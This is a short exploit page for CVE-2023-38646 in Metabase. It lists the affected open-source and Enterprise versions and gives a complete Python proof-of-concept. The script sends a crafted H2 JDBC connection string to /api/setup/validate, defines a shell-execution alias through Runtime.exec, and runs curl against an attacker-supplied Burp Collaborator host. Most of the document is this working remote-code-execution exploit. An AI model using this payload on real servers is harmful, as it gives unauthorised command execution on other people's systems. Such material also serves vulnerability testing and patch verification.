
## CVE-2023-38646

## 影响版本
Metabase open source 0.46 < 0.46.6.1
Metabase open source 0.45 < v0.45.4.1
Metabase open source 0.44 < 0.44.7.1
Metabase open source 0.43 < 0.43.7.2
Metabase Enterprise 1.45 < 1.45.4.1
Metabase Enterprise 1.46 < 1.46.6.1
Metabase Enterprise 1.44 < 1.44.7.1
Metabase Enterprise 1.43 < 1.43.7.2

```
import requests
import argparse
from colorama import Fore, Style
Gcyan = Fore.YELLOW + Style.BRIGHT
Cyan = Fore.CYAN + Style.BRIGHT
STOP = Style.RESET_ALL
logo = '''
   _____   _____   ___ __ ___ ____   ____ ___   __ _ _   __ 
  / __\ \ / / __|_|_  )  \_  )__ /__|__ /( _ ) / /| | | / / 
 | (__ \ V /| _|___/ / () / / |_ \___|_ \/ _ \/ _ \_  _/ _ \\
  \___| \_/ |___| /___\__/___|___/  |___/\___/\___/ |_|\___/
                                                            
'''
print(Gcyan + logo + STOP)
print(Cyan + "The PoC Finder!!" + STOP + Gcyan + "   By: 0xRobiul\n" + STOP)


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", type=str, required=True, help="Target URL.")
parser.add_argument("-t", "--token", type=str, required=True, help="Setup-Token From /api/session/properties .")
parser.add_argument("-c", "--collabrator", type=str, required=True, help="Burp Collabrator Client.")
args = parser.parse_args()

url = args.url + "/api/setup/validate"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "application/json", "Content-Type": "application/json", "Connection": "close"}
payload={"details": {"details": {"advanced-options": True, "classname": "org.h2.Driver", "subname": "mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(new String[]{\"sh\", \"-c\", cmd})\\;}$$\\;CALL SHELLEXEC('curl -d key=0xRobiul " + args.collabrator +"');", "subprotocol": "h2"}, "engine": "postgres", "name": "x"}, "token": args.token}
attk = requests.post(url, headers=headers, json=payload)

print(Cyan + "Done!! Check Burp Colabrator!!" + STOP)
```

